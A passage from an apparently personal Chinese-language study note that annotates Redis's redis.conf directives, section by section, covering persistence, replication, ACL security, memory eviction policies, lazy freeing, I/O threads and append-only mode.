当更改流程标题时，Redis使用以下模板来构造修改后的标题。模板变量用花括号指定。支持如下变量:\n#\n# {title}           父进程时执行的进程名，或子进程的类型\n# {listen-addr}     绑定地址或 \"*\"，后面跟着TCP或TLS端口监听，或Unix套接字(如果有的话)\n# {server-mode}     特殊模式, 例如. \"[sentinel]\" or \"[cluster]\"\n# {port}            TCP监听端口，或0\n# {tls-port}        TLS监听端口, or 0.\n# {unixsocket}      Unix套接字监听端口, or \"\".\n# {config-file}     使用的配置文件名称.\n#\nproc-title-template \"{title} {listen-addr} {server-mode}\"\n\n# 设置用于字符串比较操作的本地环境，也会影响Lua脚本的性能。空字符串表示区域设置是由环境变量派生的。\n# Set the local environment which is used for string comparison operations, and  also affect the performance of Lua scripts. \nlocale-collate \"\"\n```\n\n\n\n## SNAPSHOTTING：快照\n\n![image-20230209170518390](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20230209170518390.png) \n\n```sh\n################################ SNAPSHOTTING  ################################\n\n# 将DB数据保存到磁盘\n# save <seconds> <changes> [<seconds> <changes> ...]\n#\n# 经过给定秒数（seconds），且对DB的写操作超过了给定数量（changes），Redis将保存DB。\n# 快照可以通过一个空字符串参数完全禁用，如下例所示:\n#\n# save \"\"\n#\n# 默认情况下Redis会保存DB\n#   - 3600 1： 在3600秒(一小时)之后，至少执行了一次更改\n#   - 300 100： 在300秒(五分钟)之后，至少执行了100次更改\n#   - 60 10000： 在60秒(一分钟)之后，至少执行了10000次更改\n# 您可以通过取消注释下面的行显式地设置这些参数\n# save 3600 1 300 100 60 10000\n\n# 默认情况下，如果RDB快照启用(至少一个保存点) 并且最近的后台保存失败，Redis将停止接受写入。\n# 这将使用户意识到(以一种艰难的方式)数据没有正确地持久化在磁盘上，否则很可能没有人会注意到，从而发生一些灾难。\n# 如果后台保存进程重新开始工作，Redis将自动允许再次写入。\n#\n# 但是，如果你已经设置了适当的Redis服务器监控和持久化，你可能想要禁用这个功能，这样即使有磁盘、权限等问题，Redis也会继续正常工作。\nstop-writes-on-bgsave-error yes\n\n# 默认启用：当保存快照文件（RDB数据库）时，使用LZF压缩字符串对象。\n# 如果你想在save child中节省一些CPU，将其设置为 \"no\"，但如果你有可压缩的值或键，数据集可能会更大。\nrdbcompression yes\n\n# 从RDB版本5开始，CRC64校验和被放在文件的末尾。\n# 这使得格式更能抵抗损坏，但在保存和加载RDB文件时，会有性能损失(大约10%)，因此您可以禁用它以获得最大性能。\n# 创建的RDB文件时，禁用校验或者校验和为零，将告诉加载代码跳过该检查\nrdbchecksum yes\n\n\n# loading an RDB or RESTORE payload 时，允许或禁止对 ziplist 或者 listpack 等进行 full sanitization checks\n# 这降低了稍后在处理命令时发生断言或崩溃的可能性。\n# Options:\n#   no         - 从不执行 full sanitization\n#   yes        - 总是执行 full sanitization\n#   clients    - 仅对用户连接执行full sanitization.\n#                排除: RDB 文件, 从主连接接收到的RESTORE命令, 和具有skip-cleanup-payload ACL标志的客户端连接.\n# 默认值应该是'clients'，但由于它目前会影响通过MIGRATE进行集群重分片，因此默认情况下暂时设置为'no'。\n#\n# sanitize-dump-payload no\n\n# 配置快照文件名\ndbfilename dump.rdb\n\n# 在未启用持久性的情况下，删除实例中复制使用的RDB文件\n# 默认情况下，该选项是禁用的，但是在某些环境下，出于法规或其他安全考虑，应该尽快删除由master保存在磁盘上以提供副本，或由副本存储在磁盘上以加载它们以进行初始同步的RDB文件。\n# 注意，此选项仅在同时禁用了AOF和RDB持久性的实例中有效，否则将完全忽略。\n#\n# 获得相同效果的另一种(有时更好)方法是在主实例和副本实例上使用无磁盘复制。但是，在副本实例的环境下，无磁盘并不总是一种选择。\nrdb-del-sync-files no\n\n# 快照工作目录\n# dbfilename配置的快照文件，将被写入这个目录中\n# Append Only产生的文件也将在此目录中创建。\n#\n# 注意，这里必须指定目录，而不是文件名。\ndir ./\n```\n\n\n\n## REPLICATION：主从复制\n\n```properties\n################################# REPLICATION #################################\n\n# Master-Replica 复制. 使用replicaof使一个Redis实例成为另一个Redis服务器的副本。 \n# 关于Redis复制需要尽快了解的一些事情\n#\n#   +------------------+      +---------------+\n#   |      Master      | ---> |    Replica    |\n#   | (receive writes) |      |  (exact copy) |\n#   +------------------+      +---------------+\n#\n# 1) Redis复制是异步的，但是你可以配置一个主服务器，如果它没有与至少给定数量的副本连接，它就会停止接受写操作\n# 2) 如果复制链路在相对较短的时间内丢失，Redis副本能够与主服务器执行部分再同步。您可能需要配置复制backlog大小(请参阅此文件的下一节)，并根据您的需要设置合理的值。\n# 3) 复制是自动的，不需要用户干预，在网络分区之后，副本会自动尝试重新连接到主节点并与它们重新同步。\n#\n# replicaof <masterip> <masterport>\n\n# 如果主机有密码保护 ( “requirepass” 配置指令) 可以在启动同步复制进程之前告诉副本进行身份验证, 否则主服务器将拒绝副本请求。\n#\n# masterauth <master-password>\n#\n# 然而，如果你正在使用Redis ACL，这是不够的(适用于Redis版本6或更高版本), 默认用户不能执行PSYNC命令和/或复制所需的其他命令。\n# 在这种情况下，最好配置一个特殊用户用于复制，并指定主用户配置如下:\n#\n# masteruser <username>\n#\n# 当指定了masteruser时，副本将使用新的AUTH表单对其主服务器进行身份验证: AUTH <username> <password>.\n\n# 当一个副本失去了与主服务器的连接，或者当复制仍在进行时，副本可以以两种不同的方式工作:\n# 1) 如果 replica-serve-stale-data 配置为\"yes\"(默认) 副本仍然会回复客户端请求, 可能有过时的数据, 如果这是第一次同步，则数据集可能为空.\n# 2) 如果 replica-serve-stale-data 配置为\"no\", 副本会返回给所有请求一下错误信息：\"MASTERDOWN Link with MASTER is down and replica-serve-stale-data is set to 'no'\", 除了以下命令: INFO, REPLICAOF, AUTH, SHUTDOWN, REPLCONF, ROLE, CONFIG, SUBSCRIBE, UNSUBSCRIBE, PSUBSCRIBE, PUNSUBSCRIBE, PUBLISH, PUBSUB, COMMAND, POST, HOST and LATENCY.\n#\nreplica-serve-stale-data yes\n\n# 您可以配置副本实例是否接受写操作。\n# 针对副本实例写入可能有助于存储一些临时数据(因为写入副本的数据在与主服务器重新同步后很容易被删除)，但如果客户端由于错误配置而写入副本，也可能导致问题。\n#\n# Redis 2.6 版本之后默认副本是只读的。\n# Note: 只读副本不会被设计成暴露给互联网上不受信任的客户端。它只是防止实例被滥用的保护层。\n# 默认情况下，只读副本仍然可输出所有管理类命令，如CONFIG、DEBUG等。在有限的范围内，您可以使用'rename-command'来隐藏所有管理的、危险的命令，从而提高只读副本的安全性。\nreplica-read-only yes\n\n\n# 副本同步策略: 磁盘同步或套接字同步。\n# 新的副本和重新连接的副本不能继续复制过程，只是接收差异，需要做所谓的“完全同步”。\n#\n# RDB文件从主服务器传输到副本。有两种不同的传输方式:\n# 1) Disk-backed: Redis主进程创建一个新进程，将RDB文件写入磁盘。随后，父进程将文件增量地传输到副本\n#                 当RDB文件生成时，允许更多的副本排队，只要当前生成RDB文件的子进程完成了它的工作，排队的副本们便可以用生成的RDB文件提供服务\n# 2) Diskless: Redis主进程创建一个新进程，直接将RDB文件写入复制套接字，而不需要任何磁盘操作。\n#              使用无磁盘复制时，一旦传输开始，新的副本将进入队列，当当前传输终止时，新的传输将开始 \n#              当使用无盘复制时，主服务器在开始传输之前等待一段可配置的时间(以秒为单位)，希望有多个副本到达，并行传输数据。\n#              对于慢磁盘和快速(大带宽)网络，无磁盘复制工作得更好\nrepl-diskless-sync yes\n\n# 当启用无磁盘复制时，为了生成 通过套接字将RDB传输到副本 的子节点，可以配置服务器等待时间\n# 这很重要，因为一旦传输开始，就不可能为新的副本提供服务，这些副本将排队等待下一个RDB传输，因此服务器等待延迟以让更多副本到达。\n#\n# 延迟以秒为单位指定，默认为5秒。要完全禁用它，只需将其设置为0秒，传输将尽快开始。\nrepl-diskless-sync-delay 5\n\n# 当使用延迟启用无磁盘复制时，如果期望的最大副本数量已连接，则可以在达到最大延迟之前让复制启动。\n# 默认为0意味着没有定义最大副本数量，Redis将等待全部延迟。\nrepl-diskless-sync-max-replicas 0\n\n# -----------------------------------------------------------------------------\n# WARNING: 由于在这种设置中，副本不会立即在磁盘上存储RDB，因此在故障转移期间可能会导致数据丢失。\n# RDB无盘加载+ Redis模块不处理I/O读取可能会导致Redis在与主同步的初始阶段出现I/O错误时中止。\n# -----------------------------------------------------------------------------\n# Replica可以直接从套接字加载它从复制链路读取的RDB，或者将RDB存储到一个文件中，在从master完全接收到RDB后再读取该文件。\n#\n# 在许多情况下，磁盘比网络慢，存储和加载RDB文件可能会增加复制时间(甚至增加主服务器的Copy on Write内存和副本缓冲区)。\n# 然而，当直接从套接字解析RDB文件时，为了避免数据丢失，只有当新数据集在内存中完全加载时才会安全地刷新当前数据集，从而导致更高的内存使用量。\n# 因此，我们有以下选择:\n#\n# \"disabled\"    - 不要使用无磁盘加载(先将rdb文件存储到磁盘)\n# \"swapdb\"      - 在直接从套接字解析数据时，将当前db内容保存在RAM中。\n#                 在此模式下的副本可以在复制进行时继续服务当前数据集，除非它们无法将主服务器识别为具有来自相同复制历史的数据集\n#                 注意，这需要足够的内存，如果没有内存，就有OOM kill的风险\n# \"on-empty-db\" - 仅当当前数据集为空时使用无磁盘加载. \n#                 这样更安全，可以避免在复制期间同时加载新旧数据集。\nrepl-diskless-load disabled\n\n# 主机在预定义的时间间隔内向其副本发送ping。可以使用repl_ping_replica_period选项更改这个间隔。缺省值是10秒。\n#\n# repl-ping-replica-period 10\n\n\n# 以下选项设置的复制超时时间:\n# 1) 从副本的角度来看，同步期间的批量传输I/O\n# 2) 从副本(data, ping)的角度看主节点超时\n# 3) 从主节点的角度看副本超时(REPLCONF ACK ping)\n# 确保这个值大于为repl-ping-replica-period指定的值是很重要的，否则每次在主服务器和副本之间有低流量时都会检测到超时。缺省值是60秒。\n#\n# repl-timeout 60\n\n# 在SYNC之后禁用副本套接字上的TCP_NODELAY ?\n#  - yes： Redis将使用更少的TCP数据包和更少的带宽将数据发送到副本。但是这可能会增加数据在副本端出现的延迟，对于使用默认配置的Linux内核，延迟最长可达40毫秒。\n#  - no： 则数据出现在副本端的延迟将减少，但复制将使用更多带宽。\n# 默认情况下，我们优化低延迟，但在非常高的流量条件下，或者当主服务器和副本相隔很多跳时，将此选项变为“yes”可能是一个好主意。\nrepl-disable-tcp-nodelay no\n\n# 设置复制backlog大小。backlog是一个缓冲区，当副本断开连接一段时间后，它会积累副本数据，因此当副本想再次重新连接时，通常不需要完全重新同步，部分重新同步就足够了，只需传递断开连接时副本错过的部分数据。\n# 复制backlog越大，副本能够忍受断开的时间就越长，并且以后能够执行部分重新同步。\n# 只有当至少连接了一个副本时，才分配backlog。\n#\n# repl-backlog-size 1mb\n\n# 主服务器在一段时间内没有连接的副本后，积压将被释放。\n# 下面的选项配置需要经过的秒数，从最后一个副本断开连接的时间开始，以释放积压缓冲区。\n# 请注意，副本永远不会因为超时而释放积压，因为它们可能稍后会升级为主副本，并且应该能够正确地与其他副本“部分重新同步”:因此它们应该总是积累积压。\n#\n# 值为0意味着永远不释放待办事项。\n#\n# repl-backlog-ttl 3600\n\n# 副本优先级是Redis在INFO输出中发布的整数。它是由Redis哨兵，在主服务器不再正常工作，选择要提升为主服务器的副本时使用\n# 优先级低的副本被认为更适合升级，例如，如果有三个优先级为10，100,25的副本，哨兵会选择优先级为10的副本，这是最低的。\n# 然而，优先级为0的副本标志着该副本不能执行master角色，因此优先级为0的副本将永远不会被Redis Sentinel选中进行升级。\n#\n# 缺省情况下，优先级为100。\nreplica-priority 100\n\n# 传播错误行为控制了当Redis无法处理来自主机的复制流中正在处理的命令时，它将如何表现。传播过程中发生的错误是意外的，并可能导致数据不一致。然而，在早期版本的Redis中存在一些边缘情况，服务器可能会复制或保留在未来版本中失败的命令。因此，默认行为是忽略此类错误并继续处理命令。\n# 如果应用程序希望确保没有数据分歧，则应该将此配置设置为'panic'。该值还可以设置为'panic-on-replicas'，仅当副本在复制流上遇到错误时才恐慌。一旦有足够的安全机制来防止误报崩溃，这两个恐慌值中的一个将成为未来的默认值。\n#\n# propagation-error-behavior ignore\n\n# 副本忽略磁盘写错误控制副本在无法将从主服务器接收到的写命令持久化到磁盘时的行为。\n# 默认情况下，这个配置被设置为'no'，在这种情况下会使副本崩溃。不建议更改这个默认值，但是为了与旧版本的Redis兼容，这个配置可以切换为“yes”，这将只是记录一个警告，并执行从master得到的写命令。\n#\n# replica-ignore-disk-write-errors no\n\n\n# -----------------------------------------------------------------------------\n# 默认情况下，Redis Sentinel在报告中包含所有副本。一个副本可以排除在Redis哨兵的公告。一个未通知的副本将被'sentinel replicas <master>'命令忽略，并且不会暴露给Redis sentinel的客户端。\n# 该选项不会改变复制优先级的行为。即使replica-announce设置为“no”，副本也可以提升为主副本。为了防止这种情况发生，请将replica-priority设置为0。\n#\n# replica-announced yes\n\n# 如果连接的副本少于N个，主服务器有可能停止接受写操作，延迟小于或等于M秒。也就是N个副本需要处于“online”状态。\n# 延迟时间(以秒为单位)必须<=指定的值，是从副本接收到的最后一个ping计算出来的，通常每秒钟发送一次。\n# 此选项不保证N个副本将接受写入，但将在没有足够的副本可用的情况下将丢失写入的暴露窗口限制为指定的秒数\n# 例如，需要至少3个副本，延迟<= 10秒使用:\n#\n# min-replicas-to-write 3\n# min-replicas-max-lag 10\n#\n# 将其中一个或另一个设置为0将禁用该特性。\n# 默认情况下，min-replica-to-write设置为0(禁用功能)，min-replica-max-lag设置为10。\n\n\n# Redis主机能够以不同的方式列出附加副本的地址和端口。\n# 例如，“INFO replication”部分提供了这些信息，在其他工具中，Redis Sentinel可以使用这些信息来发现副本实例。另一个可用此信息的地方是主机的“ROLE”命令的输出。\n# 副本正常上报的列表IP地址和端口可以通过以下方式获取:\n#   IP: 通过检查副本用于连接主服务器的套接字的对端地址，可以自动检测该地址。\n#   Port: 该端口在复制握手期间由副本通信，并且通常是副本用来侦听连接的端口。\n#\n# 然而，当使用端口转发或网络地址转换(NAT)时，副本实际上可能通过不同的IP和端口对可达。副本可以使用以下两个选项向其主服务器报告特定的IP和端口集，这样INFO和ROLE都将报告这些值。\n# 如果只需要覆盖端口或IP地址，则不需要同时使用这两个选项。\n#\n# replica-announce-ip 5.5.5.5\n# replica-announce-port 1234\n```\n\n## KEYS TRACKING\n\n```properties\n############################### KEYS TRACKING #################################\n\n# Redis实现了客户端值缓存的服务器辅助支持。\n# 这是使用一个invalidation table来实现的，它使用一个按键名索引的基数键来记住客户端有哪些键。\n# 反过来，这用于向客户端发送invalidation messages。请点击本页了解更多功能:\n#   https://redis.io/topics/client-side-caching\n#\n# 当对客户端启用跟踪时，所有的只读查询都被假定为缓存:这将迫使Redis在invalidation table中存储信息。当KEY被修改时，此类信息将被清除，invalidation messages将被发送到客户端。\n# 然而，如果工作负载被读操作严重占据，Redis可能会使用越来越多的内存来跟踪多个客户端获取的键。\n# \n# 因此，可以为无效表配置一个最大填充值。默认情况下，它被设置为1M的键，一旦达到这个限制，Redis将开始从invalidation table中删除键，即使它们没有被修改，只是为了回收内存:这将反过来迫使客户端使缓存的值无效。\n# 基本上，表的最大大小是在服务器端用于跟踪谁缓存了什么信息的内存和客户端在内存中保留缓存对象的能力之间进行权衡。\n# \n# 如果将该值设置为0，则意味着没有限制，并且Redis将在无效表中保留尽可能多的键。\n# 在“stats” INFO部分中，您可以找到关于invalidation table中每个给定时刻的键数的信息。\n#\n# Note: 当在广播模式下使用KEY跟踪时，服务器端不使用内存，因此此设置是无用的。\n#\n# tracking-table-max-keys 1000000\n```\n\n## SECURITY：安全配置\n\n```properties\n################################## SECURITY ###################################\n# 在 Redis6.0中引入了ACL（Access Control List) 的支持，可以给每个用户分配不同的权限来控制权限。\n# Redis ACL用户的定义格式如下:\n#   user <username> ... acl rules ...\n#\n# For example:\n#   user worker +@list +@connection ~jobs:* on >ffa9203c493aa99\n#\n# 新连接使用特殊用户名“default”。\n# 如果该用户具有“nopass”规则，那么新的连接将立即作为“默认”用户进行身份验证，而不需要通过AUTH命令提供任何密码。\n# 否则，如果“默认”用户没有标记为“nopass”，则连接将在未验证的状态下启动，并将需要AUTH(或HELLO命令AUTH选项)才能进行身份验证并开始工作。\n#\n# 基本上ACL规则是从左到右处理的。\n#\n# ACL日志\n# ACL日志跟踪与ACL相关的失败命令和认证事件。ACL日志用于排除被ACL阻塞的命令失败的故障。ACL日志存储在内存中。可以使用ACL LOG RESET回收内存。\n# 定义下面ACL日志的最大条目长度。\nacllog-max-len 128\n\n# 使用外部ACL文件\n# 不需要在此文件中配置用户，可以使用单独列出用户的文件。两种方法不能混合使用:\n# 如果在这里配置用户，同时激活外部ACL文件，服务器将拒绝启动。\n# 外部ACL用户文件的格式与redis.conf中用于描述用户的格式完全相同。\n#\n# aclfile /etc/redis/users.acl\n\n# 重要提示: 从Redis 6开始，“requirepass” 只是一个新的ACL系统之上的兼容层。选项效果将只是为默认用户“default”设置密码。\n# 客户端仍然会像往常一样使用AUTH <password>进行身份验证，或者更明确地使用AUTH default <password>，如果他们遵循新协议:两者都可以工作。\n# requirepass与aclfile选项和ACL LOAD命令不兼容，这将导致requirepass被忽略。\n#\n# requirepass foobared\n\n\n# 默认情况下，新用户初始化具有限制性权限，通过等价于ACL规则'off resetkeys -@all'。\n# 从Redis 6.2开始，也可以使用ACL规则管理对Pub/Sub通道的访问。默认的Pub/Sub通道权限如果新用户是由acl-pubsub-default配置指令控制的，该指令接受以下值之一:\n#  - allchannels: 允许访问所有的Pub/Sub频道\n#  - resetchannels: 撤销对所有发布/订阅频道的访问\n# 从Redis 7.0开始，acl-pubsub-default默认为'resetchannels'权限。\n#\n# acl-pubsub-default resetchannels\n\n# 命令重命名(弃用)。\n# ------------------------------------------------------------------------\n# WARNING: 尽可能避免使用此选项。相反，使用acl从默认用户中删除命令，只将它们放在您为管理目的而创建的某个管理用户中。\n# ------------------------------------------------------------------------\n# 可以在共享环境中更改危险命令的名称。例如，CONFIG命令可能会被重命名为难以猜测的内容，以便它仍然对内部使用的工具可用，但对普通客户端不可用。\n# 举例：\n# rename-command CONFIG b840fc02d524045429941cc15f59e41cb7be6c52\n# 也可以通过将命令重命名为空字符串来完全终止命令:\n# rename-command CONFIG \"\"\n#\n# 请注意，更改登录到AOF文件或传输到副本的命令的名称可能会导致问题。\n```\n\n## CLIENT：客户端 \n\n```sh\n################################### CLIENTS ####################################\n# 设置客户端同时最大连接数。\n#  默认情况下，这个限制被设置为10000个客户端，但是如果Redis服务器不能配置进程文件限制，以允许指定的限制，允许的最大客户端数量被设置为当前文件限制-32(因为Redis保留了一些文件描述符供内部使用)\n# 一旦达到限制，Redis将关闭所有的新连接，发送一个错误'max number of clients reached'.\n#\n# 重要说明: 当使用Redis集群时，最大连接数也与集群总线共享:集群中的每个节点将使用两个连接，一个传入连接，另一个传出连接。在非常大的集群的情况下，相应地调整限制是很重要的。\n#\n# maxclients 10000\n```\n\n## MEMORY MANAGEMENT：内存管理\n\n```properties\n############################## MEMORY MANAGEMENT ################################\n\n# 将内存使用限制设置为指定的字节数。当达到内存限制时，Redis将尝试根据所选的清除策略(参见maxmemory-policy)删除键。\n# 如果Redis不能根据策略删除键，或者如果策略设置为'noeviction'， Redis将开始回复会使用更多内存的命令，如SET, LPUSH等，并将继续回复只读命令，如GET。\n# 当使用Redis作为LRU或LFU缓存，或为实例设置硬内存限制(使用'noeviction'策略)时，此选项通常很有用。\n#\n# maxmemory <bytes>\n\n# MAXMEMORY策略:当达到MAXMEMORY时，Redis如何选择要删除的内容。您可以在以下行为中选择:\n#\n# volatile-lru -> 使用近似的LRU驱逐，仅具有过期时间的KEY\n# allkeys-lru -> 使用近似的LRU驱逐任何键。\n# volatile-lfu -> 使用近似LFU驱逐LFU, 仅具有过期时间的KEY\n# allkeys-lfu -> 使用近似的LFU驱逐任何键\n# volatile-random -> 删除具有过期时间设置的随机KEY\n# allkeys-random -> 删除一个随机的任意KEY\n# volatile-ttl -> 使用最近的过期时间(小TTL)删除KEY\n# noeviction -> 不要清除任何东西，只是在写操作时返回一个错误。\n#\n# LRU （Least Recently Used）：最近最少使用\n# LFU （Least Frequently Used）：最不经常使用的\n#\n# LRU、LFU和volatile-ttl均采用近似随机化算法实现。\n#\n# 注意:使用上述任何一种策略，当没有合适的键用于驱逐时，Redis将在需要更多内存的写操作时返回一个错误。\n# 这些命令通常用于创建新KEY、添加数据或修改现有KEY。例如:SET、INCR、HSET、LPUSH、SUNIONSTORE、SORT(由于STORE参数)和EXEC(如果事务包含任何需要内存的命令)。\n# 默认配置：\n#\n# maxmemory-policy noeviction\n\n# LRU、LFU和最小TTL算法都不是精确算法，而是近似算法(为了节省内存)，因此您可以调整它的速度或精度。\n# 默认情况下，Redis将检查五个键，并选择一个最近使用最少的键，您可以使用以下配置指令更改样本大小。默认值5可以产生足够好的结果。10非常接近真实的LRU，但消耗更多的CPU。3更快，但不是很准确\n#\n# maxmemory-samples 5\n\n# 驱逐处理被设计为在默认设置下正常工作。\n# 如果有一个异常大的写流量，这个值可能需要增加。降低这个值可能会降低延迟，但会影响清除处理的有效性\n#   0 = minimum latency, 10 = default, 100 = process without regard to latency\n#\n# maxmemory-eviction-tenacity 10\n\n# 从Redis 5开始，默认情况下副本将忽略其maxmemory设置(除非在故障转移后或手动将其提升为主内存)。\n# 这意味着KEY的删除将仅由主服务器处理，将DEL命令发送到副本，作为主服务器中的KEY删除。\n# 这种行为可以确保主副本和副本保持一致，这通常是你想要的，但是如果你的副本是可写的，或者你想让副本有一个不同的内存设置，并且你确定对副本执行的所有写入都是幂等的，那么你可以改变这个默认值(但一定要理解你在做什么)。\n# 请注意，由于副本默认情况下不驱逐，因此它最终可能会使用比maxmemory设置的内存更多的内存(副本上的某些缓冲区可能更大，或者数据结构有时可能占用更多内存等等)。因此，请确保监视副本，并确保它们有足够的内存，在主服务器达到配置的maxmemory设置之前不会出现真正的内存不足情况。\n#\n# replica-ignore-maxmemory yes\n\n# Redis以两种方式回收过期KEY:当这些KEY被发现过期时，在访问时，以及在后台，在所谓的“活动过期KEY”中回收。KEY空间被缓慢地交互式地扫描，寻找要回收的过期KEY，这样就有可能释放过期KEY的内存，并且在短时间内不会再次访问这些KEY。\n# 过期周期的默认工作将尽量避免在内存中保留超过10%的过期KEY，并尽量避免消耗总内存的25%以上，并增加系统的延迟。\n# 然而，可以将通常设置为“1”的过期“effort”增加到更大的值，直到值“10”。\n# 在其最大值时，系统将使用更多的CPU，更长的周期(技术上可能会引入更多的延迟)，并且系统中仍然存在的已经过期的KEY将更少。这是内存、CPU和延迟之间的权衡。\n#\n# active-expire-effort 1\n```\n\n## LAZY FREEING\n\n```properties\n############################# LAZY FREEING ####################################\n\n# Redis有两个删除键的原语。一个称为DEL，是对对象的阻塞删除。这意味着服务器停止处理新命令，以便以同步方式回收与对象关联的所有内存。\n# 如果删除的键与一个小对象相关联，执行DEL命令所需的时间非常小，与Redis中的大多数其他O(1)或O(log_N)命令相当。\n# 但是，如果键与包含数百万个元素的聚合值相关联，则服务器可能阻塞很长时间(甚至几秒钟)以完成操作。\n#\n# 出于上述原因，Redis还提供了非阻塞删除原语，如UNLINK(非阻塞DEL)和FLUSHALL和FLUSHDB命令的ASYNC选项，以便在后台回收内存。这些命令在常数时间内执行。另一个线程将在后台以最快的速度递增地释放对象。\n#\n# FLUSHALL和FLUSHDB的DEL、UNLINK和ASYNC选项由用户控制.\n# 什么时候使用一种或另一种是好主意，这取决于应用程序的设计。\n# 然而，Redis服务器有时不得不删除键或刷新整个数据库作为其他操作的副作用。\n# 具体来说，Redis在以下场景中独立于用户调用删除对象:\n#\n# 1) 在清除时，由于maxmemory和maxmemory策略配置，为了为新数据腾出空间，不会超过指定的内存限制.\n# 2) 因为过期:当一个键具有相关的生存时间(参见expire命令)时，必须从内存中删除.\n# 3) 因为将数据存储在可能已经存在的键上的命令的副作用。\n     例如，RENAME命令，当它被另一个KEY替换时，可能会删除旧的KEY内容。类似地，带有STORE选项的SUNIONSTORE或SORT可以删除现有的键。\n     SET命令本身删除指定键的任何旧内容，以便用指定的字符串替换它.\n# 4) 在复制过程中，当一个副本与它的主数据库执行完全重新同步时，整个数据库的内容将被删除，以便加载刚刚传输的RDB文件\n#\n# 在上述所有情况下，默认是以阻塞方式删除对象，就像调用DEL一样。但是，您可以使用以下配置指令专门配置每种情况，以便像调用UNLINK一样以非阻塞的方式释放内存\n\nlazyfree-lazy-eviction no\nlazyfree-lazy-expire no\nlazyfree-lazy-server-del no\nreplica-lazy-flush no\n\n# 当用户调用DEL代码替换为UNLINK调用是不容易的情况下，修改DEL命令的默认行为，完全像UNLINK，使用以下配置指令:\nlazyfree-lazy-user-del no\n\n# FLUSHDB, FLUSHALL, SCRIPT FLUSH and FUNCTION FLUSH 同时支持异步和同步删除, 可以通过将[SYNC|ASYNC]标志传递到命令中来控制。\n# 当两个标志都没有传递时，该指令将用于确定是否应该异步删除数据。\nlazyfree-lazy-user-flush no\n```\n\n## THREADED I/O\n\n```sh\n################################ THREADED I/O ：慢I/O访问线程操作 #################################\n\n# Redis主要是单线程的，但是也有一些线程操作，如UNLINK，慢I/O访问和其他在边线程上执行的事情。\n#\n# 现在也可以在不同的I/O线程中处理Redis客户端的套接字读写。\n# 由于写的很慢，通常Redis用户使用流水线来加快每个核的性能，并生成多个实例来扩展。使用I/O线程，可以轻松地将Redis加速两倍，而无需诉诸于流水线或实例分片。\n# 默认情况下线程是禁用的，我们建议只在至少有4个或更多内核的机器上启用它，至少留下一个备用内核。\n# 使用超过8个线程不太可能有太大帮助。我们也建议只有当你真的有性能问题时才使用线程I/O，因为Redis实例能够使用相当大比例的CPU时间，否则使用这个特性没有任何意义。\n#\n# 例如，如果你有一个四核CPU，尝试使用2或3个I/O线程，如果你有一个8核，尝试使用6个线程。为了启用I/O线程，使用以下配置指令:\n#\n# io-threads 4\n#\n# 将io-threads设置为1将会像往常一样使用主线程。当I/O线程被启用时，我们只使用线程进行写操作，即执行write(2)系统调用并将客户端缓冲区传输到套接字。\n# 然而，也可以使用以下配置指令启用读取线程和协议解析，将其设置为yes:\n#\n# io-threads-do-reads no\n#\n# 通常，线程读取没有太大帮助。\n# NOTE 1: 这个配置指令不能在运行时通过CONFIG SET修改。此外，当启用SSL时，此特性目前无法工作。\n# NOTE 2:如果你想使用red -benchmark测试Redis的加速，确保你也在线程模式下运行基准测试本身，使用——threads选项来匹配Redis线程的数量，否则你将无法注意到这些改进。\n```\n\n\n\n## KERNEL OOM CONTROL\n\n```sh\n############################ KERNEL OOM CONTROL：内核oom控制 ##############################\n\n# 在Linux上，可以提示内核OOM杀手在内存不足时应该首先杀死哪些进程。\n# 启用这个特性可以使Redis主动控制所有进程的oom_score_adj值，这取决于它们的角色。\n# 默认分数将尝试在所有其他进程之前杀死后台子进程，并在主进程之前杀死副本。\n# Redis支持以下选项:\n# - no:       不要更改oom-score-adj(默认值)。\n# - yes:      “相对”的别名见下文。\n# - absolute: om-score-adj- Values中的值被写入内核。\n#- relative:  这些值在服务器启动时相对于oom_score_adj的初始值使用，然后被限制在-1000到1000的范围内。因为初始值通常为0，所以它们通常会与绝对值匹配。\noom-score-adj no\n\n# 当使用oom-score-adj时，该指令控制主进程、副本进程和后台子进程的特定值。数值范围为-2000到2000(越高意味着越有可能被杀死)。\n# 没有特权的进程(不是根进程，并且没有CAP_SYS_RESOURCE功能)可以自由地增加其值，但不能将其降低到初始设置以下。\n# 这意味着将oom-score-adj设置为“相对”，并将oom-score-adj-values设置为正值总是会成功。\noom-score-adj-values 0 200 800\n```\n\n\n\n## KERNEL transparent hugepage CONTROL\n\n```sh\n#################### KERNEL transparent hugepage CONTROL ###################### \n# 通常内核的透明大页面控件设置为“madvise”或者默认为“never”(/sys/kernel/mm/transparent_hugepage/enabled)，这样，此配置无效。\n# 在将其设置为“always”的系统中，Redis将为了Redis进程尝试禁用它，为了避免延迟问题（特别是fork(2)和CoW的延迟问题）。\n# 如果出于某种原因，您更喜欢保持启用，您可以将此配置设置为“no”，并将内核全局设置为“always”。\ndisable-thp yes\n```\n\n\n\n## APPEND ONLY MODE：追加模式\n\n```sh\n############################## APPEND ONLY MODE ###############################\n\n# 默认情况下，Redis会异步将数据集转储到磁盘上。这种模式在许多应用程序中已经足够好了，但是Redis进程的问题或停电可能会导致几分钟的写入丢失(取决于配置的保存点)。\n# 仅追加文件是另一种持久性模式，它提供了更好的持久性。\n# 例如，使用默认的数据fsync策略(参见后面的配置文件)，Redis可以在一个意外事件中丢失一秒钟的写操作内容（比如服务器断电，或者如果Redis进程本身发生了一些错误），但Reids程序仍然正常运行。\n# AOF和RDB持久性可以同时启用，没有任何问题.\n# 如果启动时启用AOF, Redis将加载AOF，这是具有更好的持久性保证的文件。\n#\n# Please check https://redis.io/topics/persistence for more information.\n\nappendonly no\n\n# 仅附加文件的基本名称\n# Redis 7和更新版本使用一组只能追加的文件来持久化数据集和应用于它的更改。使用的文件有两种基本类型:\n# - 基本文件，它是表示创建文件时数据集完整状态的快照。 基本文件的形式可以是RDB (binary serialized：二进制序列化) or AOF (textual commands：文本命令).\n# - 增量文件，其中包含在前一个文件之后应用于数据集的其他命令。\n#\n# 此外，清单文件用于跟踪文件及其创建和应用它们的顺序。\n# Append-only文件的文件名是由Redis按照特定的模式创建的。文件名的前缀基于“appendfilename”配置参数，后面跟着关于序列和类型的附加信息。\n# 例如，如果appendfilename设置为appendonly.aof，可以导出以下文件名:\n# - appendonly.aof.1.base.rdb （基本文件）\n# - appendonly.aof.1.incr.aof, appendonly.aof.2.incr.aof （增量文件）\n# - appendonly.aof.manifest （清单文件）\n\nappendfilename \"appendonly.aof\"\n\n# 为了方便起见，Redis将所有持久的仅追加文件存储在专用目录中。目录的名称由appenddirname配置参数决定。\nappenddirname \"appendonlydir\"\n\n# 